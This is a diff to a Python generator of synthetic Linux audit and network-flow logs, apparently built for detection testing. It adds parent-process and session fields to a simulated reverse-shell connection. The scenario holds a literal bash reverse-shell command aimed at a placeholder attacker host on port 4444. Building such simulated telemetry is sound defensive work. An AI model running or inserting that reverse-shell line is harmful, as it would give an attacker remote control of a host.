@@ -124,15 +124,15 @@ class Builder:
         return pid
 
     def connect(self, host: str, ts: datetime, ip: str, port: int, *, exe: str, uid: int = 0,
-                pid: int | None = None, success: bool = True) -> None:
+                pid: int | None = None, ppid: int | None = None, ses: int = 4, success: bool = True) -> None:
         self.serial[host] += 1
         serial = self.serial[host]
         pid = pid or self.pid[host]
         self._audit(host, ts, serial, "SYSCALL",
                     f'arch=c000003e syscall=42 success={"yes" if success else "no"} '
-                    f'exit={0 if success else -115} a0=3 a1=7ffd a2=10 a3=0 items=0 ppid={pid - 1} pid={pid} '
+                    f'exit={0 if success else -115} a0=3 a1=7ffd a2=10 a3=0 items=0 ppid={ppid or pid - 1} pid={pid} '
                     f'auid={uid} uid={uid} gid={uid} euid={uid} suid={uid} fsuid={uid} egid={uid} sgid={uid} '
-                    f'fsgid={uid} tty=(none) ses=4 comm="{exe.rsplit("/", 1)[-1]}" exe="{exe}" key=(null)')
+                    f'fsgid={uid} tty=(none) ses={ses} comm="{exe.rsplit("/", 1)[-1]}" exe="{exe}" key=(null)')
         self._audit(host, ts, serial, "SOCKADDR", f"saddr={_saddr(ip, port)}")
         self._audit(host, ts, serial, "PROCTITLE", f"proctitle={_hex(exe)}")
 
@@ -292,7 +292,9 @@ def build(scale: int = 1, seed: int = 7) -> dict[str, list[dict]]:
     rev = b.exec_group("web1", t + timedelta(seconds=7), ["/bin/bash", "-c",
                                                          f"bash -i >& /dev/tcp/{ATTACKER}/4444 0>&1"],
                        uid=33, ppid=shell, ses=4294967295, cwd="/tmp", tty="(none)")
-    b.connect("web1", t + timedelta(seconds=7, milliseconds=100), ATTACKER, 4444, exe="/bin/bash", uid=33, pid=rev)
+    # the reverse shell's connect carries its process's real parent and session, as the kernel records them
+    b.connect("web1", t + timedelta(seconds=7, milliseconds=100), ATTACKER, 4444, exe="/bin/bash", uid=33, pid=rev,
+              ppid=shell, ses=4294967295)
     b.flow(t + timedelta(seconds=7), HOSTS["web1"], 42424, ATTACKER, 4444, seconds=600.0, state="established",
            to_server=90000, to_client=4000)
     b.session(t + timedelta(seconds=7), HOSTS["web1"], 42424, ATTACKER, 4444, seconds=600.0)
